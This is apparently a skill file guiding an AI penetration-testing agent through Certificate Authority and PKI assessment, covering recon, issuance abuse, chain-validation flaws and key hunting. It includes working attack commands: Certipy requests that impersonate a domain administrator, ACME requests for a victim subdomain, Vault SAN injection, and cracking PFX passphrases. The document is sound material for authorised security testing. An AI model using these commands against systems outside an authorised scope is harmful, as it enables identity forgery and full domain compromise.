---
name: pki_ca
description: Assess Certificate Authority / PKI assets for weak issuance controls, broken chain validation, and exposed signing keys.
---

# Certificate Authority / PKI

A Certificate Authority and its surrounding PKI (issuing CAs, RA/enrollment front-ends, OCSP/CRL responders, ACME/SCEP/EST endpoints, key stores, and the certificates themselves) is a root of trust: anything that can coerce it to issue, or that can forge a chain it accepts, mints credentials the rest of the estate trusts implicitly. The attacker objective here is to obtain or impersonate a trusted identity — by getting a cert issued for a name you do not control, by exploiting a verifier that accepts an attacker-built chain, or by recovering signing key material — then pivot to TLS interception, auth bypass (mTLS/SSO), code signing, or domain-wide impersonation. Treat the CA as identity-issuing infrastructure, not "just a web server."

## Attack Surface

**Issuance / enrollment endpoints**
- ACME directory (`/acme/directory`, `/.well-known/acme/`), Let's Encrypt-style validators
- SCEP (`/scep`, `/certsrv/mscep/`), EST (`/.well-known/est/cacerts`, `/simpleenroll`), CMP
- AD CS web enrollment (`/certsrv/`), CES/CEP (`/ADPolicyProvider_CEP_*`, `/*_CES_*`), NDES
- Vault PKI (`/v1/pki/issue/<role>`, `/v1/pki/sign/<role>`), step-ca, smallstep, cfssl, EJBCA RA

**Validation / revocation surface**
- OCSP responders (`/ocsp`), CRL distribution points (URLs in cert CRLDP), AIA (CA issuer URLs)
- Any service that validates client certs (mTLS gateways, SSO/IdP, VPN, MQTT, gRPC)

**Key & config exposure**
- Private keys, PKCS#12/`.pfx`/`.jks`, CA DB, HSM/PKCS#11 config, KMS/Key Vault references
- Cert templates / issuance policies / role definitions (where SANs, EKU, name constraints live)

**The certificates themselves** — public CT logs, TLS handshakes, leaked bundles in repos/images.

## Recon & Enumeration

```bash
# Subdomains + live PKI hosts
subfinder -d target.tld -silent | httpx -silent -title -tech-detect -o hosts.txt
naabu -host target.tld -p 80,443,8443,9000,9443,8200 -silent | httpx -silent

# Inspect the served leaf + full chain, EKU, SANs, key size, sig alg
echo | openssl s_client -connect target.tld:443 -servername target.tld -showcerts 2>/dev/null \
  | openssl x509 -noout -text -fingerprint -sha256
nmap --script ssl-cert,ssl-enum-ciphers,ssl-known-key -p 443,8443 target.tld

# Certificate Transparency: harvest every name the CA has issued for the org
curl -s "https://crt.sh/?q=%25.target.tld&output=json" | jq -r '.[].name_value' | sort -u

# Discover enrollment / responder paths
ffuf -u https://target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,401,403 -fs 0
katana -u https://target.tld -jc -silent | grep -Ei 'acme|scep|est|ocsp|certsrv|/pki/|crl'
curl -s https://target.tld/acme/directory | jq .            # ACME capabilities
curl -s https://target.tld/.well-known/est/cacerts | openssl pkcs7 -inform DER -print_certs -noout

# Nuclei templates for PKI/TLS/CA misconfig (templates already in sandbox)
nuclei -u https://target.tld -tags ssl,tls,exposure, acme,vault -s critical,high,medium -silent -j -o pki.jsonl
nuclei -l hosts.txt -t ssl/ -t http/exposures/ -rl 30 -c 10 -bs 10 -j -o pki_ssl.jsonl

# Hunt leaked keys/PFX/bundles in source, history, and images
trufflehog filesystem ./repo --only-verified
gitleaks detect -s ./repo --no-banner
trivy image registry.target.tld/app:latest --scanners secret,misconfig
semgrep --config p/secrets ./repo

# Active Directory Certificate Services (install Certipy)
pipx install certipy-ad
certipy find -u user@target.tld -p 'Passw0rd' -dc-ip 10.0.0.10 -vulnerable -stdout
# LDAP read of pKICertificateTemplate objects if you have creds
ldapsearch -x -H ldap://10.0.0.10 -D 'user@target.tld' -w 'Passw0rd' \
  -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=target,DC=tld'
```

## Methodology

1. **Map the trust hierarchy.** Pull the served chain and CT data; identify root, intermediates, issuing CAs, and which services *trust* this CA (mTLS gateways, IdP, package/code signing). The verifiers are often the real target.
2. **Enumerate issuance entry points.** ACME, SCEP/EST/CMP, AD CS web enrollment, Vault/step-ca roles. For each, determine: who can request, what identity validation runs, and which fields (SAN, EKU, CN, validity, CA:TRUE) the requester influences.
3. **Test issuance controls.** Attempt to obtain a certificate for a name/identity you do not legitimately control (see Key Weaknesses). Start with low-impact names you *can* prove control of to learn the flow, then probe authorization gaps.
4. **Test chain validation on the verifiers.** Feed each cert-consuming service crafted chains: wrong EKU, expired/revoked leaf, self-signed, mismatched SAN, name-constraint violations, and ALG=none-style downgrades.
5. **Test revocation.** Confirm OCSP/CRL are actually checked and fail *closed*. A revoked-but-accepted cert is a finding.
6. **Hunt key material.** Grep repos, CI, backups, container images, and config endpoints for private keys, PKCS#12, and HSM/KMS misconfigs that allow signing-key use or export.
7. **Validate and chain.** Convert any accepted forged identity into concrete impact (mTLS bypass, TLS MITM, signed artifact) with a minimal PoC, then stop.

## Key Weaknesses / Techniques

**Weak / missing domain validation in ACME or RA.** If the validator checks `http://host/.well-known/acme-challenge/<token>` but the host is attacker-influenceable (shared hosting, dangling subdomain, SSRF-reachable internal validator, or a request-routing/host-header confusion), you can satisfy validation for a name you do not own.
```bash
certbot certonly --manual --preferred-challenges http -d victim-subdomain.target.tld \
  --server https://target.tld/acme/directory --register-unsafely-without-email
```
Verify whether DNS-01 falls back to a wildcard-trusting resolver, and whether CAA records are enforced at issuance.

**Over-permissive issuance roles / templates (SAN injection).** Roles that let the requester set arbitrary SANs or `subjectAltName` extensions, or templates with `ENROLLEE_SUPPLIES_SUBJECT`, let you mint a cert for any identity.
```bash
# Vault PKI role that allows any domain / any SAN
vault write pki/issue/web common_name="admin@target.tld" \
  alt_names="sso.target.tld" ip_sans="10.0.0.10"
```

**AD CS escalation (ESC1–ESC8).** Templates allowing requester-supplied SAN + client-auth EKU + low enrollment rights = domain account impersonation. Validate with Certipy:
```bash
certipy req -u user@target.tld -p 'Passw0rd' -dc-ip 10.0.0.10 \
  -ca 'target-CA' -template VulnTemplate -upn administrator@target.tld
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
```
ESC8 = NTLM relay to the web-enrollment endpoint (`/certsrv/certfnsh.asp`) — relay a machine account to obtain a DC cert.

**Broken chain validation on verifiers.** Common verifier bugs to assess:
- Accepts any cert signed by *a* trusted CA regardless of EKU (TLS-server cert reused for client auth).
- Validates the leaf signature but not the full path to a trusted root, or ignores `pathLenConstraint`/`CA:TRUE` so an intermediate can sign anything.
- Honors a leaf's SAN without confirming the issuing CA is constrained to that namespace (missing `nameConstraints`).
- Pins/compares the *Subject DN* string instead of cryptographic identity → spoofable.

**Revocation not enforced.** Service ignores OCSP/CRL, or "soft-fails" when the responder is unreachable → revoked/stolen certs keep working. Confirm AIA/CRLDP are reachable and checked.

**Weak crypto / predictable serials.** MD5/SHA-1 signatures, RSA-1024, Debian-weak keys, or sequential serials enabling collision/forgery. `nmap --script ssl-known-key` flags known-compromised keys.

**Exposed signing keys.** `.pfx`/`.jks`/`*.key` in repos, S3, or images; brittle passphrases crackable with `pfx2john`/`john`. Possession of an intermediate or root key = full forgery.

## Validation

1. **Forged identity, demonstrably trusted.** Show a cert you obtained/crafted for a name you do not control, *and* show a real verifier accepting it (e.g. `curl --cert forged.pem --key forged.key https://mtls.target.tld/whoami` returns the impersonated principal). Trust by one client without a consuming service is weaker evidence.
2. **Issuance authorization gap.** Capture the full enrollment request/response proving the CA issued without adequate identity proof; include the issued cert's SAN/EKU and the requesting principal's (lack of) rights.
3. **Revocation bypass.** Revoke a test cert (or use a known-revoked one), then show the verifier still accepts it; capture the OCSP/CRL response (or its absence) at the time.
4. **Key recovery.** Prove the recovered key matches the CA/leaf by signing a fresh CSR or matching modulus: `openssl x509 -noout -modulus -in cert.pem | openssl md5` vs `openssl rsa -noout -modulus -in found.key | openssl md5`.

## False Positives

- A cert with a scary-looking SAN that no production verifier actually trusts (only in a private test store) — not exploitable.
- crt.sh entries for names the org legitimately owns or for pre-cert/CT-test entries; confirm the name is out of the requester's authority before claiming SAN abuse.
- "Self-signed cert accepted" by a client you configured to skip verification (`-k`, `verify=False`) — the misconfig is yours, not the asset's.
- OCSP soft-fail that is the documented, accepted design with a compensating short-lived-cert policy.
- AD CS templates flagged by `certipy find` as vulnerable but with enrollment ACLs that exclude all reachable principals — verify you can actually enroll.
- Expired cert served on a host that is decommissioned/out of scope.

## Chaining & Impact

- Forged client cert → mTLS/SSO bypass → authenticated access as any user/service → app-level RCE or data access.
- AD CS ESC1/ESC8 → certificate for `administrator`/DC machine → Kerberos PKINIT → Domain Admin / DCSync → full domain compromise.
- Issuance of a valid TLS leaf for a victim domain → on-path TLS interception (combine with DNS/ARP/routing control) → credential and session theft.
- Recovered intermediate/root key → forge unlimited trusted certs and code-signing certs → supply-chain / update-channel compromise.
- Over-permissive Vault PKI role → mint service identities → lateral movement across a service mesh that trusts the CA.

## Pro Tips

1. The CA is rarely the prize — the *verifiers* are. Enumerate everything that trusts this CA before you spend effort forging; an unconsumed cert is just bytes.
2. Always inspect EKU and `nameConstraints`. A TLS-server CA with no EKU restriction and no name constraints is a forgery factory; many verifiers don't recheck EKU.
3. On Windows estates, run `certipy find -vulnerable` early — ESC1/ESC8 are extremely common and convert directly to Domain Admin.
4. Test revocation by *unplugging* the responder: block OCSP/CRL egress and see if validation soft-fails open. Soft-fail is the rule, not the exception.
5. CT logs (crt.sh) are free recon for issuance scope, internal hostnames, and short-lived/automation certs that reveal the issuance pipeline.
6. Diff how different clients build/verify chains (OpenSSL vs Go vs Java vs browsers) — path-building and constraint enforcement differ, and the weakest verifier defines exploitability.
7. Check serial-number entropy and signature algorithm on every issued cert; predictable serials + weak hash is a (rare but real) forgery path.
8. For ACME/SCEP, probe whether validation runs from an internal resolver/fetcher you can influence — host-header, dangling DNS, and SSRF turn DV into a free identity.
9. Match recovered keys to certs by modulus hash before claiming key compromise; a stray `.key` may belong to a dev/self-signed cert, not the CA.
